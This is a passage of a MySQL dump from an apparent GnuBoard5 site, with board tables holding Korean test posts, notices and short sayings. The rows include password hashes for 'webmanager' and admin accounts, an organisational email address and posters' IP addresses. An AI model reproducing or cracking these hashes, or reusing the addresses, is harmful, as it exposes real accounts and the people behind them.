  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_lecture_real`
--

LOCK TABLES `g5_write_lecture_real` WRITE;
/*!40000 ALTER TABLE `g5_write_lecture_real` DISABLE KEYS */;
INSERT INTO `g5_write_lecture_real` VALUES (1,-1,'',1,0,1,'','','html2','테스트 영상입니다.','잘나오나요?','','',1,0,32,0,0,'webmanager','*457A703CCA1D0C92DB477BA44E1246F6639F96CD','웹 메니져','webmanager@jubinna.or.kr','','2015-02-12 17:13:52',0,'2015-02-12 21:31:40','210.216.54.2','','','','','','','test.mp4','','','','',''),(2,-1,'',1,1,1,'','','','','좋습니다.','','',0,0,0,0,0,'webmanager','*457A703CCA1D0C92DB477BA44E1246F6639F96CD','웹 메니져','webmanager@jubinna.or.kr','','2015-02-12 21:31:40',0,'','61.102.95.177','','','','','','','','','','','',''),(3,-2,'',3,0,0,'','','','링크 테스트','링크 테스트 중','','',0,0,10,0,0,'webmanager','*457A703CCA1D0C92DB477BA44E1246F6639F96CD','웹 메니져','webmanager@jubinna.or.kr','','2015-02-12 23:40:04',0,'2015-02-12 23:40:04','119.214.110.45','','','','','','http://www.w3schools.com/html/mov_bbb.mp4','','','','','',''),(4,-3,'',4,0,0,'','','','test3','stst','','',0,0,5,0,0,'webmanager','*457A703CCA1D0C92DB477BA44E1246F6639F96CD','웹 메니져','webmanager@jubinna.or.kr','','2015-05-05 21:41:31',0,'2015-05-05 21:41:31','61.102.12.196','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_lecture_real` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_lecture_text`
--

DROP TABLE IF EXISTS `g5_write_lecture_text`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_lecture_text` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_lecture_text`
--

LOCK TABLES `g5_write_lecture_text` WRITE;
/*!40000 ALTER TABLE `g5_write_lecture_text` DISABLE KEYS */;
INSERT INTO `g5_write_lecture_text` VALUES (1,-1,'',1,0,0,'','','','test001','test','','',0,0,3,0,0,'webmanager','*457A703CCA1D0C92DB477BA44E1246F6639F96CD','웹 메니져','webmanager@jubinna.or.kr','','2015-05-04 16:34:16',0,'2015-05-04 16:34:16','118.37.92.209','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_lecture_text` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_main_banner`
--

DROP TABLE IF EXISTS `g5_write_main_banner`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_main_banner` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_me2day_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_main_banner`
--

LOCK TABLES `g5_write_main_banner` WRITE;
/*!40000 ALTER TABLE `g5_write_main_banner` DISABLE KEYS */;
INSERT INTO `g5_write_main_banner` VALUES (1,-1,'',1,0,0,'','','html1','메인 배너1','메인 배너1<br>','','',0,0,'',1,0,0,'admin','4d9436990dd66a11','최고관리자','admin@domain','','2014-05-04 03:08:56',1,'2014-05-04 03:08:56','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_main_banner` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_mission_01`
--

DROP TABLE IF EXISTS `g5_write_mission_01`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_mission_01` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_mission_01`
--

LOCK TABLES `g5_write_mission_01` WRITE;
/*!40000 ALTER TABLE `g5_write_mission_01` DISABLE KEYS */;
INSERT INTO `g5_write_mission_01` VALUES (4,-2,'',4,0,0,'','','','안될때 그 방법을 달리하여라 그러면 더 이상적이다','안될때 그 방법을 달리하여라 그러면 더 이상적이다.','','',0,0,17,0,0,'admin','*D8547A79ABD7B39B8E837C7C6D8E8CD87E877CEF','최고관리자','admin@domain.com','','2015-02-22 12:29:13',1,'2015-02-22 12:29:13','110.70.52.139','','','','','','','','','','','',''),(2,-1,'',2,0,0,'','','','생각을 놀리지 말고 움직여 생각해라.','..','','',0,0,24,0,0,'admin','*D8547A79ABD7B39B8E837C7C6D8E8CD87E877CEF','최고관리자','admin@domain.com','','2015-02-16 11:50:06',1,'2015-02-16 11:50:06','112.216.179.210','','','','','','','','','','','',''),(5,-3,'',5,0,0,'','','','어리석은 자는 겉보고 좋아하지만 지혜로운 사람은 속보고 좋아한다','어리석은 자는 겉보고 좋아하지만 지혜로운 사람은 속보고 좋아한다','','',0,0,25,0,0,'admin','*D8547A79ABD7B39B8E837C7C6D8E8CD87E877CEF','최고관리자','admin@domain.com','','2015-02-22 19:52:13',1,'2015-02-22 19:52:13','175.223.21.242','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_mission_01` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_notice`
--

DROP TABLE IF EXISTS `g5_write_notice`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_notice` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_notice`
--

LOCK TABLES `g5_write_notice` WRITE;
/*!40000 ALTER TABLE `g5_write_notice` DISABLE KEYS */;
INSERT INTO `g5_write_notice` VALUES (1,-1,'',1,0,0,'','','html1','공지 사항입니다','공지 사항입니다.<br />','','',0,0,'',12,0,0,'admin','12d0346b4847233f','최고관리자','admin@localhost.localdomain','','2012-09-04 01:03:23',0,'2012-09-04 01:03:23','127.0.0.1','','','','1','2','','','','','','','',''),(5,-3,'',5,0,0,'','','html1','공지 사항입니다','공지 사항입니다.<br />','','',0,0,'',17,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-28 22:53:35',0,'2013-05-28 22:53:35','127.0.0.1','','','','','','','','','','','','',''),(4,-2,'',4,0,0,'','','html1','공지 사항입니다','공지 사항입니다.<br />','','',0,0,'',2,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-28 22:53:07',0,'2013-05-28 22:53:07','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_notice` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_notics`
--

DROP TABLE IF EXISTS `g5_write_notics`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_notics` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_notics`
--

LOCK TABLES `g5_write_notics` WRITE;
/*!40000 ALTER TABLE `g5_write_notics` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_write_notics` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_qna`
--

DROP TABLE IF EXISTS `g5_write_qna`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_qna` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_qna`
--

LOCK TABLES `g5_write_qna` WRITE;
/*!40000 ALTER TABLE `g5_write_qna` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_write_qna` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_ref_text`
--

DROP TABLE IF EXISTS `g5_write_ref_text`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_ref_text` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_ref_text`
--

LOCK TABLES `g5_write_ref_text` WRITE;
/*!40000 ALTER TABLE `g5_write_ref_text` DISABLE KEYS */;
INSERT INTO `g5_write_ref_text` VALUES (1,-1,'',1,0,0,'','','','글 1','글 글','','',0,0,2,0,0,'admin','*D8547A79ABD7B39B8E837C7C6D8E8CD87E877CEF','최고관리자','admin@domain.com','','2015-02-12 15:04:22',0,'2015-02-12 15:04:22','210.216.54.2','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_ref_text` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_ref_video`
--

DROP TABLE IF EXISTS `g5_write_ref_video`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_ref_video` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_ref_video`
--

LOCK TABLES `g5_write_ref_video` WRITE;
/*!40000 ALTER TABLE `g5_write_ref_video` DISABLE KEYS */;
INSERT INTO `g5_write_ref_video` VALUES (1,-1,'',1,0,0,'','','','test','test\r\n동영상 링크: http://www.w3schools.com/html/mov_bbb.mp4','','',0,0,15,0,0,'admin','*D8547A79ABD7B39B8E837C7C6D8E8CD87E877CEF','최고관리자','admin@domain.com','','2015-02-12 15:03:44',1,'2015-02-12 15:03:44','210.216.54.2','','','','','','http://www.w3schools.com/html/mov_bbb.mp4','','','','','',''),(2,-2,'',2,0,0,'','','','테스트','ㅎㅎ','','',0,0,15,0,0,'admin','*D8547A79ABD7B39B8E837C7C6D8E8CD87E877CEF','최고관리자','admin@domain.com','','2015-02-12 15:11:03',1,'2015-02-12 15:11:03','210.216.54.2','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_ref_video` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_request`
--

DROP TABLE IF EXISTS `g5_write_request`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_request` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
